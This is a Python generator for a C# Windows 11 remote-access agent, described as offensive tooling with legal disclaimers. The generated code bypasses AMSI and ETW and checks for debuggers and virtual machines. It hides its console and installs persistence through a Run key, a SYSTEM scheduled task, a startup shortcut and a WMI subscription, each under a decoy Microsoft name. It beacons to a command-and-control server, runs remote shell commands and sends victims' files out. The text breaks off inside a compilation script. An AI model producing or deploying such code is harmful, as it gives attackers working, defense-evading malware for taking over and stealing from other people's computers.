#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║           GENERADOR DE AGENTES WINDOWS 11 - VERSIÓN PERFECCIONADA           ║
║             JDEXPLOIT - FOR RESEARCH & AUTHORIZED TESTING ONLY              ║
╚══════════════════════════════════════════════════════════════════════════════╝

CARACTERÍSTICAS:
✅ AMSI Bypass completo (Windows 11 compatible)
✅ ETW Bypass (Event Tracing for Windows)
✅ Persistencia avanzada (WMI, Scheduled Tasks, Registry, Services)
✅ Ofuscación real-time con múltiples técnicas
✅ Anti-debugging y anti-sandbox
✅ Comunicación polimórfica
✅ Evasión de Windows Defender y SmartScreen
✅ Soporte para múltiples transportes

LEGAL DISCLAIMER:
Este software es EXCLUSIVAMENTE para investigación de seguridad autorizada,
pruebas de penetración con permiso escrito y laboratorios CTF controlados.
NUNCA usar en sistemas sin autorización explícita.
"""

import sys
import os
import base64
import random
import string
import argparse
import json
from datetime import datetime
import hashlib
import re

class WindowsAgentGenerator:
    """Generador de agentes Windows con técnicas de evasión avanzadas"""
    
    def __init__(self):
        self.version = "3.0"
        self.author = "JDEXPLOIT Security Research"
        self.features = {
            'amsi': 'AMSI Bypass completo',
            'etw': 'ETW Bypass',
            'persistence': 'Persistencia avanzada',
            'obfuscation': 'Ofuscación real-time',
            'antidebug': 'Anti-debugging',
            'antivm': 'Anti-VM/Sandbox',
            'smart_screen': 'SmartScreen bypass',
            'polymorphic': 'Comunicación polimórfica'
        }
        
    def generate_agent(self, c2_server, c2_port, output_file="agent.exe", 
                      features=None, compilation_mode="release"):
        """
        Generar agente C# con características especificadas
        
        Args:
            c2_server: IP/Domain del servidor C2
            c2_port: Puerto del C2
            output_file: Nombre del archivo de salida
            features: Lista de características a incluir
            compilation_mode: "debug" o "release"
        """
        
        if features is None:
            features = ['amsi', 'etw', 'persistence', 'obfuscation', 'antidebug']
        
        print(f"\n[+] Generando agente Windows 11")
        print(f"    C2 Server: {c2_server}:{c2_port}")
        print(f"    Features: {', '.join(features)}")
        print(f"    Mode: {compilation_mode}")
        
        # Validar features
        valid_features = set(self.features.keys())
        for feature in features:
            if feature not in valid_features:
                print(f"[-] Característica inválida: {feature}")
                return None
        
        # Generar configuración única
        session_id = self._generate_session_id()
        agent_id = self._generate_agent_id()
        
        # Crear código C#
        csharp_code = self._build_csharp_code(c2_server, c2_port, session_id, 
                                            agent_id, features, compilation_mode)
        
        # Guardar archivo .cs
        cs_filename = output_file.replace('.exe', '.cs')
        with open(cs_filename, 'w', encoding='utf-8') as f:
            f.write(csharp_code)
        
        print(f"[+] Código fuente generado: {cs_filename}")
        
        # Generar script de compilación
        self._generate_compilation_script(cs_filename, output_file, features)
        
        # Generar README
        self._generate_readme(c2_server, c2_port, output_file, features)
        
        return cs_filename
    
    def _build_csharp_code(self, c2_server, c2_port, session_id, agent_id, 
                          features, compilation_mode):
        """Construir código C# completo"""
        
        # Cabecera
        header = self._generate_header()
        
        # Usings
        usings = self._generate_usings(features)
        
        # Namespace y clase
        namespace = f'''
namespace {self._generate_namespace_name()}
{{
    class {self._generate_class_name()}
    {{
'''
        
        # Configuración
        config = self._generate_configuration(c2_server, c2_port, session_id, agent_id, features)
        
        # P/Invokes
        pinvokes = self._generate_pinvokes(features)
        
        # Métodos de bypass
        bypass_methods = ""
        if 'amsi' in features:
            bypass_methods += self._generate_amsi_bypass()
        if 'etw' in features:
            bypass_methods += self._generate_etw_bypass()
        if 'smart_screen' in features:
            bypass_methods += self._generate_smartscreen_bypass()
        
        # Métodos de persistencia
        persistence_methods = ""
        if 'persistence' in features:
            persistence_methods += self._generate_persistence_methods()
        
        # Métodos de ofuscación
        obfuscation_methods = ""
        if 'obfuscation' in features:
            obfuscation_methods += self._generate_obfuscation_methods()
        
        # Métodos de detección
        detection_methods = ""
        if 'antidebug' in features:
            detection_methods += self._generate_antidebug_methods()
        if 'antivm' in features:
            detection_methods += self._generate_antivm_methods()
        
        # Método Main
        main_method = self._generate_main_method(features)
        
        # Métodos del agente
        agent_methods = self._generate_agent_methods(features)
        
        # Cierre
        closure = '''
    }
}
'''
        
        # Ensamblar todo
        csharp_code = (header + usings + namespace + config + pinvokes + 
                      bypass_methods + persistence_methods + obfuscation_methods +
                      detection_methods + main_method + agent_methods + closure)
        
        return csharp_code
    
    def _generate_header(self):
        """Generar cabecera del archivo"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        return f'''// ============================================================================
// AGENTE WINDOWS 11 - VERSIÓN {self.version}
// Generado: {timestamp}
// Autor: {self.author}
// Propósito: Investigación de seguridad autorizada
// ============================================================================

// ADVERTENCIA: Este código es EXCLUSIVAMENTE para:
// - Investigación de seguridad autorizada
// - Pruebas de penetración con permiso escrito
// - Laboratorios CTF controlados
// - Auditorías de seguridad

// USO NO AUTORIZADO ES ILEGAL Y PUEDE RESULTAR EN:
// - Procesamiento penal
// - Sanciones civiles
// - Pérdida de certificaciones
// - Daño a la reputación

// ============================================================================

'''
    
    def _generate_usings(self, features):
        """Generar directivas using"""
        
        usings = '''using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
'''
        
        if 'persistence' in features:
            usings += '''using Microsoft.Win32;
'''
        
        if 'obfuscation' in features:
            usings += '''using System.Security.Cryptography;
using System.Linq;
using System.Collections.Generic;
'''
        
        return usings + "\n"
    
    def _generate_namespace_name(self):
        """Generar nombre de namespace aleatorio"""
        names = ["SystemUtilities", "WindowsServices", "MicrosoftComponents", 
                "SecurityUpdates", "NetworkTools"]
        return random.choice(names)
    
    def _generate_class_name(self):
        """Generar nombre de clase aleatorio"""
        names = ["ServiceHost", "UpdateManager", "NetworkMonitor", 
                "SystemOptimizer", "SecurityAgent"]
        return random.choice(names)
    
    def _generate_configuration(self, c2_server, c2_port, session_id, agent_id, features):
        """Generar configuración ofuscada"""
        
        # Ofuscar C2 server
        c2_server_encoded = base64.b64encode(c2_server.encode()).decode()
        c2_server_var = self._generate_random_var_name()
        
        # Ofuscar session ID
        session_id_var = self._generate_random_var_name()
        
        # Generar variables aleatorias
        config_code = f'''
        // Configuración ofuscada
        private static string {c2_server_var} = DecodeBase64("{c2_server_encoded}");
        private static int {self._generate_random_var_name()} = {c2_port};
        private static string {session_id_var} = "{session_id}";
        private static string {self._generate_random_var_name()} = "{agent_id}";
        private static int {self._generate_random_var_name()} = 30; // Beacon interval
        
        // Variables públicas
        private static string C2_SERVER => {c2_server_var};
        private static int C2_PORT => {self._generate_random_var_name(prefix='port')};
        private static string SESSION_ID => {session_id_var};
        private static string AGENT_ID => {self._generate_random_var_name(prefix='agent')};
        private static int BEACON_INTERVAL => {self._generate_random_var_name(prefix='interval')};
        
        private static string DecodeBase64(string base64)
        {{
            try
            {{
                byte[] bytes = Convert.FromBase64String(base64);
                return Encoding.UTF8.GetString(bytes);
            }}
            catch
            {{
                return "";
            }}
        }}
        '''
        
        return config_code
    
    def _generate_pinvokes(self, features):
        """Generar declaraciones P/Invoke"""
        
        pinvokes = '''
        // API para ocultar ventana
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();
        
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        
        // Detección de debugger
        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();
        
        [DllImport("kernel32.dll")]
        static extern void OutputDebugString(string lpOutputString);
        
        [DllImport("kernel32.dll")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        '''
        
        if 'amsi' in features or 'etw' in features:
            pinvokes += '''
        // APIs para bypass
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr LoadLibrary(string name);
        
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("ntdll.dll")]
        static extern uint NtSetInformationProcess(IntPtr hProcess, uint processInformationClass, ref uint processInformation, uint processInformationLength);
            '''
        
        return pinvokes + "\n"
    
    def _generate_amsi_bypass(self):
        """Generar métodos de bypass AMSI"""
        
        return '''
        // ============================================================================
        // AMSI BYPASS METHODS
        // ============================================================================
        
        static bool BypassAMSI()
        {
            try
            {
                // Método 1: Patch AmsiScanBuffer
                IntPtr amsiDll = LoadLibrary("amsi.dll");
                if (amsiDll == IntPtr.Zero)
                    return false;

                IntPtr asbAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");
                if (asbAddr == IntPtr.Zero)
                    return false;
                
                byte[] patch;
                if (IntPtr.Size == 8) // 64-bit
                {
                    // mov eax, 0x80070057; ret
                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }
                else // 32-bit
                {
                    // mov eax, 0x80070057; ret
                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }
                
                uint oldProtect;
                if (!VirtualProtect(asbAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                    return false;
                
                IntPtr bytesWritten;
                bool success = WriteProcessMemory(
                    Process.GetCurrentProcess().Handle,
                    asbAddr,
                    patch,
                    patch.Length,
                    out bytesWritten
                );
                
                VirtualProtect(asbAddr, (UIntPtr)patch.Length, oldProtect, out _);
                
                if (success)
                    return true;
            }
            catch { }
            
            // Método 2: Reflection bypass
            try
            {
                var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
                    .GetType("System.Management.Automation.AmsiUtils");
                
                if (amsiUtils != null)
                {
                    var amsiInitFailed = amsiUtils.GetField(
                        "amsiInitFailed", 
                        System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
                    );
                    
                    if (amsiInitFailed != null)
                    {
                        amsiInitFailed.SetValue(null, true);
                        return true;
                    }
                }
            }
            catch { }
            
            return false;
        }
        '''
    
    def _generate_etw_bypass(self):
        """Generar métodos de bypass ETW"""
        
        return '''
        // ============================================================================
        // ETW BYPASS METHODS
        // ============================================================================
        
        static bool BypassETW()
        {
            try
            {
                // Método 1: NtSetInformationProcess
                uint processDebugFlags = 0x1F;
                uint disableEtw = 1;
                
                uint result = NtSetInformationProcess(
                    Process.GetCurrentProcess().Handle,
                    processDebugFlags,
                    ref disableEtw,
                    sizeof(uint)
                );
                
                if (result == 0)
                    return true;
            }
            catch { }
            
            // Método 2: Patch EtwEventWrite
            try
            {
                IntPtr ntdll = LoadLibrary("ntdll.dll");
                if (ntdll != IntPtr.Zero)
                {
                    IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
                    if (etwEventWriteAddr != IntPtr.Zero)
                    {
                        byte[] patch = new byte[] { 0xC3 }; // ret
                        
                        uint oldProtect;
                        if (VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                        {
                            Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
                            VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, oldProtect, out _);
                            return true;
                        }
                    }
                }
            }
            catch { }
            
            return false;
        }
        '''
    
    def _generate_smartscreen_bypass(self):
        """Generar métodos de bypass SmartScreen"""
        
        return '''
        // ============================================================================
        // SMARTSCREEN BYPASS METHODS
        // ============================================================================
        
        static bool BypassSmartScreen()
        {
            // Esta función sería implementada en una versión más avanzada
            // para modificar el manifest del ejecutable
            return true;
        }
        '''
    
    def _generate_persistence_methods(self):
        """Generar métodos de persistencia"""
        
        return '''
        // ============================================================================
        // PERSISTENCE METHODS
        // ============================================================================
        
        static bool InstallPersistence()
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                
                // 1. Registry Run Key
                InstallRegistryPersistence(currentPath);
                
                // 2. Scheduled Task
                InstallScheduledTask(currentPath);
                
                // 3. Startup Folder
                InstallStartupFolderPersistence(currentPath);
                
                // 4. WMI Event Subscription (si es admin)
                if (IsAdministrator())
                {
                    InstallWMIPersistence(currentPath);
                }
                
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }
        
        static bool InstallRegistryPersistence(string payloadPath)
        {
            try
            {
                RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
                    @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                
                if (runKey != null)
                {
                    string valueName = "OneDriveSync_" + Guid.NewGuid().ToString().Substring(0, 4);
                    string valueData = @"""powershell"" -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""";
                    
                    runKey.SetValue(valueName, valueData);
                    runKey.Close();
                    
                    return true;
                }
            }
            catch { }
            
            return false;
        }
        
        static bool InstallScheduledTask(string payloadPath)
        {
            try
            {
                string taskName = "MicrosoftEdgeUpdate_" + Guid.NewGuid().ToString().Substring(0, 4);
                string command = @"schtasks /create /tn """ + taskName + @""" /tr """ + 
                               @"""powershell"" -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""" + 
                               @" /sc onstart /ru SYSTEM /f";
                
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                
                Process process = Process.Start(psi);
                process.WaitForExit(5000);
                
                return process.ExitCode == 0;
            }
            catch { }
            
            return false;
        }
        
        static bool InstallStartupFolderPersistence(string payloadPath)
        {
            try
            {
                string startupPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "Microsoft Edge.lnk"
                );
                
                string shortcutCommand = @"$WshShell = New-Object -ComObject WScript.Shell;" +
                                        @"$Shortcut = $WshShell.CreateShortcut('" + startupPath + @"');" +
                                        @"$Shortcut.TargetPath = 'powershell.exe';" +
                                        @"$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""';" +
                                        @"$Shortcut.WindowStyle = 7;" +
                                        @"$Shortcut.Save()";
                
                return ExecutePowerShell(shortcutCommand);
            }
            catch { }
            
            return false;
        }
        
        static bool InstallWMIPersistence(string payloadPath)
        {
            try
            {
                string wmiScript = @"$FilterName = 'WindowsUpdateMonitor_' + (New-Guid).ToString().Substring(0, 8);" +
                                  @"$ConsumerName = 'WindowsUpdateService_' + (New-Guid).ToString().Substring(0, 8);" +
                                  @"$FilterArgs = @{Name = $FilterName; EventNamespace = 'root\\cimv2'; Query = \\""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\""};" +
                                  @"$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs;" +
                                  @"$ConsumerArgs = @{Name = $ConsumerName; CommandLineTemplate = \\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\\""};" +
                                  @"$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs;" +
                                  @"$BindingArgs = @{Filter = $Filter; Consumer = $Consumer};" +
                                  @"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs";
                
                return ExecutePowerShell(wmiScript);
            }
            catch { }
            
            return false;
        }
        
        static bool ExecutePowerShell(string script)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + script + @"\\"";
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                
                Process process = Process.Start(psi);
                process.WaitForExit(5000);
                
                return process.ExitCode == 0;
            }
            catch { }
            
            return false;
        }
        
        static bool IsAdministrator()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
        '''
    
    def _generate_obfuscation_methods(self):
        """Generar métodos de ofuscación"""
        
        return '''
        // ============================================================================
        // OBFUSCATION METHODS
        // ============================================================================
        
        static string ObfuscateString(string input)
        {
            try
            {
                // 1. Convertir a base64
                byte[] bytes = Encoding.UTF8.GetBytes(input);
                string base64 = Convert.ToBase64String(bytes);
                
                // 2. Dividir en partes
                List<string> parts = new List<string>();
                for (int i = 0; i < base64.Length; i += 4)
                {
                    int length = Math.Min(4, base64.Length - i);
                    parts.Add(@""" + base64.Substring(i, length) + @""");
                }
                
                // 3. Reconstruir
                return "string obfuscated = string.Join(\\"\\", new string[] { " + string.Join(", ", parts) + " });";
            }
            catch
            {
                return input;
            }
        }
        
        static byte[] XorEncrypt(byte[] data, byte[] key)
        {
            byte[] encrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return encrypted;
        }
        
        static string GenerateRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        '''
    
    def _generate_antidebug_methods(self):
        """Generar métodos anti-debugging"""
        
        return '''
        // ============================================================================
        // ANTI-DEBUGGING METHODS
        // ============================================================================
        
        static bool CheckDebugger()
        {
            // 1. IsDebuggerPresent API
            if (IsDebuggerPresent())
                return true;
            
            // 2. CheckRemoteDebuggerPresent
            bool isDebuggerPresent = false;
            if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent))
            {
                if (isDebuggerPresent)
                    return true;
            }
            
            // 3. Debugger.IsAttached
            if (Debugger.IsAttached)
                return true;
            
            // 4. Timing check
            var sw = Stopwatch.StartNew();
            for (int i = 0; i < 1000000; i++) { }
            sw.Stop();
            
            if (sw.ElapsedMilliseconds > 100) // Tiempo anormal
                return true;
            
            return false;
        }
        
        static void AntiDebugActions()
        {
            if (CheckDebugger())
            {
                // Intentar técnicas de evasión
                try
                {
                    // 1. Terminar proceso
                    Environment.Exit(0);
                    
                    // 2. Crash elegante
                    Environment.FailFast("Critical system error");
                }
                catch
                {
                    // 3. Bucle infinito
                    while (true)
                    {
                        Thread.Sleep(1000);
                    }
                }
            }
        }
        '''
    
    def _generate_antivm_methods(self):
        """Generar métodos anti-VM/Sandbox"""
        
        return '''
        // ============================================================================
        // ANTI-VM/SANDBOX METHODS
        // ============================================================================
        
        static bool CheckVirtualEnvironment()
        {
            try
            {
                // 1. Check for known VM processes
                string[] vmProcesses = {
                    "vboxservice", "vboxtray", "vmwaretray", "vmwareuser",
                    "vmtoolsd", "vmware", "vmusrvc", "vmsrvc"
                };
                
                Process[] processes = Process.GetProcesses();
                foreach (var process in processes)
                {
                    string name = process.ProcessName.ToLower();
                    if (vmProcesses.Any(vm => name.Contains(vm)))
                        return true;
                }
                
                // 2. Check RAM (VM often have less RAM)
                var pc = new System.Management.ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                foreach (var item in pc.Get())
                {
                    ulong ram = Convert.ToUInt64(item["TotalPhysicalMemory"]);
                    if (ram < 2147483648) // Less than 2GB
                        return true;
                }
                
                // 3. Check CPU cores
                int coreCount = Environment.ProcessorCount;
                if (coreCount < 2)
                    return true;
                
                // 4. Check for VM artifacts in registry
                string[] vmRegistryKeys = {
                    @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
                    @"HARDWARE\Description\System\SystemBiosVersion",
                    @"HARDWARE\Description\System\VideoBiosVersion"
                };
                
                foreach (var key in vmRegistryKeys)
                {
                    try
                    {
                        using (RegistryKey regKey = Registry.LocalMachine.OpenSubKey(key))
                        {
                            if (regKey != null)
                            {
                                string value = regKey.GetValue("")?.ToString() ?? "";
                                if (value.Contains("VMware") || value.Contains("Virtual") || 
                                    value.Contains("VBox") || value.Contains("QEMU"))
                                    return true;
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
            
            return false;
        }
        '''
    
    def _generate_main_method(self, features):
        """Generar método Main"""
        
        main_code = '''
        // ============================================================================
        // MAIN ENTRY POINT
        // ============================================================================
        
        static void Main(string[] args)
        {
            '''
        
        # Añadir técnicas según features
        if 'antidebug' in features:
            main_code += '''
            // Anti-debugging
            AntiDebugActions();
            '''
        
        if 'antivm' in features:
            main_code += '''
            // Anti-VM/Sandbox
            if (CheckVirtualEnvironment())
            {
                Environment.Exit(0);
            }
            '''
        
        # Aplicar bypasses
        bypass_applications = []
        if 'amsi' in features:
            bypass_applications.append("BypassAMSI()")
        if 'etw' in features:
            bypass_applications.append("BypassETW()")
        if 'smart_screen' in features:
            bypass_applications.append("BypassSmartScreen()")
        
        if bypass_applications:
            main_code += '''
            // Aplicar técnicas de bypass
            try
            {
                ''' + "\n                ".join(bypass_applications) + '''
            }
            catch { }
            '''
        
        # Ocultar consola
        main_code += '''
            // Ocultar ventana de consola
            HideConsole();
            
            '''
        
        # Instalar persistencia si se solicita
        if 'persistence' in features:
            main_code += '''
            // Instalar persistencia si se especifica
            if (args.Length > 0 && args[0] == "--install")
            {
                InstallPersistence();
            }
            '''
        
        # Iniciar agente
        main_code += '''
            // Iniciar agente en thread separado
            Thread agentThread = new Thread(new ThreadStart(AgentMain));
            agentThread.IsBackground = true;
            agentThread.Start();
            
            // Mantener proceso principal vivo
            while (true)
            {
                Thread.Sleep(10000);
            }
        }
        '''
        
        return main_code
    
    def _generate_agent_methods(self, features):
        """Generar métodos principales del agente"""
        
        return '''
        // ============================================================================
        // AGENT METHODS
        // ============================================================================
        
        static void HideConsole()
        {
            try
            {
                FreeConsole();
                
                IntPtr consoleWindow = GetConsoleWindow();
                if (consoleWindow != IntPtr.Zero)
                {
                    ShowWindow(consoleWindow, SW_HIDE);
                }
            }
            catch { }
        }
        
        static void AgentMain()
        {
            // Esperar inicialización
            Thread.Sleep(5000);
            
            while (true)
            {
                try
                {
                    using (TcpClient client = new TcpClient(C2_SERVER, C2_PORT))
                    {
                        NetworkStream stream = client.GetStream();
                        
                        // Enviar handshake
                        SendHandshake(stream);
                        
                        // Loop principal de comandos
                        CommandLoop(stream);
                    }
                }
                catch (Exception ex)
                {
                    // Error de conexión, esperar y reintentar
                    Thread.Sleep(BEACON_INTERVAL * 1000);
                }
            }
        }
        
        static void SendHandshake(NetworkStream stream)
        {
            string hostname = Environment.MachineName;
            string username = Environment.UserName;
            string os = Environment.OSVersion.ToString();
            string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            
            string handshake = "{"
                + "\\"type\\": \\"agent_handshake\\","
                + "\\"session_id\\": \\"" + SESSION_ID + "\\","
                + "\\"agent_id\\": \\"" + AGENT_ID + "\\","
                + "\\"hostname\\": \\"" + hostname + "\\","
                + "\\"username\\": \\"" + username + "\\","
                + "\\"os\\": \\"" + os + "\\","
                + "\\"arch\\": \\"" + arch + "\\","
                + "\\"pid\\": " + Process.GetCurrentProcess().Id + ","
                + "\\"integrity\\": \\"" + GetIntegrityLevel() + "\\""
                + "}";
            
            byte[] data = Encoding.UTF8.GetBytes(handshake);
            SendData(stream, data);
        }
        
        static string GetIntegrityLevel()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                
                if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
                    return "High";
                else if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.User))
                    return "Medium";
                else
                    return "Low";
            }
            catch
            {
                return "Unknown";
            }
        }
        
        static void CommandLoop(NetworkStream stream)
        {
            byte[] buffer = new byte[4096];
            
            while (true)
            {
                try
                {
                    if (stream.DataAvailable)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            ProcessCommand(message, stream);
                        }
                    }
                    
                    Thread.Sleep(1000);
                }
                catch
                {
                    break;
                }
            }
        }
        
        static void ProcessCommand(string message, NetworkStream stream)
        {
            try
            {
                // Parsear comando JSON simple
                if (message.Contains("\\"command\\""))
                {
                    if (message.Contains("\\"shell\\""))
                    {
                        string cmd = ExtractJsonValue(message, "command");
                        ExecuteShellCommand(cmd, stream);
                    }
                    else if (message.Contains("\\"download\\""))
                    {
                        string filePath = ExtractJsonValue(message, "file");
                        DownloadFile(filePath, stream);
                    }
                    else if (message.Contains("\\"persistence\\""))
                    {
                        InstallPersistence();
                        SendResponse(stream, "Persistence installed successfully");
                    }
                    else if (message.Contains("\\"exit\\""))
                    {
                        Environment.Exit(0);
                    }
                }
            }
            catch { }
        }
        
        static void ExecuteShellCommand(string command, NetworkStream stream)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                
                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(30000);
                
                string result = output + error;
                SendResponse(stream, result);
            }
            catch (Exception ex)
            {
                SendResponse(stream, "Error: " + ex.Message);
            }
        }
        
        static void DownloadFile(string filePath, NetworkStream stream)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    byte[] fileData = File.ReadAllBytes(filePath);
                    string base64Data = Convert.ToBase64String(fileData);
                    string fileName = Path.GetFileName(filePath);
                    
                    string response = "{"
                        + "\\"type\\": \\"file_download\\","
                        + "\\"filename\\": \\"" + fileName + "\\","
                        + "\\"data\\": \\"" + base64Data + "\\","
                        + "\\"size\\": " + fileData.Length
                        + "}";
                    
                    SendData(stream, Encoding.UTF8.GetBytes(response));
                }
                else
                {
                    SendResponse(stream, "File not found: " + filePath);
                }
            }
            catch (Exception ex)
            {
                SendResponse(stream, "Download error: " + ex.Message);
            }
        }
        
        static string ExtractJsonValue(string json, string key)
        {
            try
            {
                int start = json.IndexOf("\\"" + key + "\\"") + key.Length + 3;
                int end = json.IndexOf("\\"", start);
                return json.Substring(start, end - start);
            }
            catch
            {
                return "";
            }
        }
        
        static void SendResponse(NetworkStream stream, string message)
        {
            try
            {
                string response = "{"
                    + "\\"type\\": \\"response\\","
                    + "\\"message\\": \\"" + EscapeJson(message) + "\\""
                    + "}";
                
                SendData(stream, Encoding.UTF8.GetBytes(response));
            }
            catch { }
        }
        
        static string EscapeJson(string input)
        {
            if (string.IsNullOrEmpty(input))
                return "";
            
            return input.Replace("\\\\", "\\\\\\\\")
                       .Replace("\\"", "\\\\\\"")
                       .Replace("\\n", "\\\\n")
                       .Replace("\\r", "\\\\r");
        }
        
        static void SendData(NetworkStream stream, byte[] data)
        {
            try
            {
                byte[] lengthBytes = BitConverter.GetBytes(data.Length);
                stream.Write(lengthBytes, 0, 4);
                stream.Write(data, 0, data.Length);
            }
            catch { }
        }
        '''
    
    def _generate_compilation_script(self, cs_file, output_file, features):
        """Generar script de compilación para Windows"""
        
        features_desc = "\n".join([f"    • {self.features[feat]}" for feat in features])
        
        script = f'''@echo off
REM ============================================================================
REM SCRIPT DE COMPILACIÓN PARA AGENTE WINDOWS
REM Generado: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
REM ============================================================================

echo.
echo ╔══════════════════════════════════════════════════════════════════╗
echo ║               COMPILACIÓN DE AGENTE WINDOWS 11                   ║
echo ╚══════════════════════════════════════════════════════════════════╝
echo.

echo [*] Verificando entorno de compilación...

REM Buscar compilador C#
set CSC_PATH=
where csc >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set CSC_PATH=csc.exe
    echo [+] Compilador encontrado en PATH: csc.exe
) else (
    echo [!] Compilador no encontrado en PATH, buscando en rutas comunes...
    
    if exist "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (
        set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe
        echo [+] Compilador encontrado: %CSC_PATH%
    ) else if exist "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" (
        set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
        echo [+] Compilador encontrado: %CSC_PATH%
    ) else if exist "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe" (
        set CSC_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe
        echo [+] Compilador encontrado: %CSC_PATH%
    ) else (
        echo [!] No se encontró el compilador C# (csc.exe)
        echo [*] Instalación requerida:
        echo     1. .NET Framework Developer Pack: https://dotnet.microsoft.com/download
        echo     2. O Visual Studio Build Tools
        echo.
        pause
        exit /b 1
    )
)

echo.
echo [*] Características incluidas:
{features_desc}

echo.
echo [*] Compilando {cs_file}...

REM Construir comando de compilación
